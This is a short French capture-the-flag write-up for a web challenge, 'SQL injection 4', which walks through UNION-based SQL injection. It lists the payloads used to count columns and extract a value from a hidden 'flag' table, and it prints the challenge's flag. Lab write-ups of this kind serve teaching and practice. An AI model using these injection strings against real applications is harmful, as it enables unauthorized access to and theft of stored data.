# SQL injection 4

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Ce quatrième défi d'injection SQL requiert de charger des données qui sont dans une autre table. La table `users` ne contient qu'un seul utilisateur: `admin`. Cependant, il existe une nouvelle table `flag` qui contient un certain nombre de colonnes. Parmis ces colonnes, on trouve la colonne `flag` qui contient ce que vous cherchez. 

## Setup

Requirements:
- BurpSuite

# Writeup

https://portswigger.net/web-security/sql-injection/union-attacks

En se basant sur la technique expliquée dans la page web ci-haut, on doit déterminer le nombre de colonnes. 

`" union select 1 from flag--`
`" union select 1,2 from flag--`
`" union select 1,2,3 from flag--`

Les deux premières requêtes donnent un erreur. La troisième retourne `3`. On sait que pour afficher le flag, on devra utiliser la troisième colonne, donc on essaye la requête `" union select 1,2,flag from flag--`. 

C'est à ce moment qu'on obtient le flag `FLAG-373fc3b97cb4cd80d07942d92add1379unionizethis`.
